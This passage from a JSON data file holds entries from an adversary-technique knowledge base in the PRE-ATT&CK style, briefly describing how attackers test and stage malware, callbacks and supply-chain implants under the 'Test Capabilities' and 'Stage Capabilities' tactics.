            "Tactic": "Test Capabilities",
            "Version": "1.0"
        },
        "Test callback functionality": {
            "Name": "Test callback functionality",
            "Description": "Callbacks are malware communications seeking instructions. An adversary will test their malware to ensure the appropriate instructions are conveyed and the callback software can be reached. [1]\n",
            "ID": "T1356",
            "Tactic": "Test Capabilities",
            "Version": "1.0"
        },
        "Test malware in various execution environments": {
            "Name": "Test malware in various execution environments",
            "Description": "Malware may perform differently on different platforms (computer vs handheld) and different operating systems (Ubuntu vs OS X), and versions (Windows 7 vs 10) so malicious actors will test their malware in the environment(s) where they most expect it to be executed. [1]\n",
            "ID": "T1357",
            "Tactic": "Test Capabilities",
            "Version": "1.0"
        },
        "Test malware to evade detection": {
            "Name": "Test malware to evade detection",
            "Description": "An adversary can run their code on systems with cyber security protections, such as antivirus products, in place to see if their code is detected. They can also test their malware on freely available public services. [1]\n",
            "ID": "T1359",
            "Tactic": "Test Capabilities",
            "Version": "1.0"
        },
        "Test physical access": {
            "Name": "Test physical access",
            "Description": "An  adversary can test physical access options in preparation for the actual attack. This could range from observing behaviors and noting security precautions to actually attempting access. [1] [2]\n",
            "ID": "T1360",
            "Tactic": "Test Capabilities",
            "Version": "1.0"
        },
        "Test signature detection for file upload/email filters": {
            "Name": "Test signature detection for file upload/email filters",
            "Description": "An adversary can test their planned method of attack against existing security products such as email filters or intrusion detection sensors (IDS). [1]\n",
            "ID": "T1361",
            "Tactic": "Test Capabilities",
            "Version": "1.0"
        },
        "Disseminate removable media": {
            "Name": "Disseminate removable media",
            "Description": "Removable media containing malware can be injected in to a supply chain at large or small scale. It can also be physically placed for someone to find or can be sent to someone in a more targeted manner. The intent is to have the user utilize the removable media on a system where the adversary is trying to gain access. [1] [2] [3]\n",
            "ID": "T1379",
            "Tactic": "Stage Capabilities",
            "Version": "1.0"
        },
        "Distribute malicious software development tools": {
            "Name": "Distribute malicious software development tools",
            "Description": "An adversary could distribute malicious software development tools (e.g., compiler) that hide malicious behavior in software built using the tools. [1] [2]\n",
            "ID": "T1394",
            "Tactic": "Stage Capabilities",
            "Version": "1.0"
        },
        "Hardware or software supply chain implant": {
            "Name": "Hardware or software supply chain implant",
            "Description": "During production and distribution, the placement of software, firmware, or a CPU chip in a computer, handheld, or other electronic device that enables an adversary to gain illegal entrance. [1] [2]\n",
            "ID": "T1365",
            "Tactic": "Stage Capabilities",
            "Version": "1.0"
        },
        "Port redirector": {
            "Name": "Port redirector",
            "Description": "Redirecting a communication request from one address and port number combination to another. May be set up to obfuscate the final location of communications that will occur in later stages of an attack. [1]\n",
            "ID": "T1363",
            "Tactic": "Stage Capabilities",
            "Version": "1.0"
        },
        "Upload, install, and configure software/tools": {
            "Name": "Upload, install, and configure software/tools",
            "Description": "An adversary may stage software and tools for use during later stages of an attack. The software and tools may be placed on systems legitimately in use by the adversary or may be placed on previously compromised infrastructure. [1] [2]\n",
            "ID": "T1362",
            "Tactic": "Stage Capabilities",
            "Version": "1.0"
        }
    }
}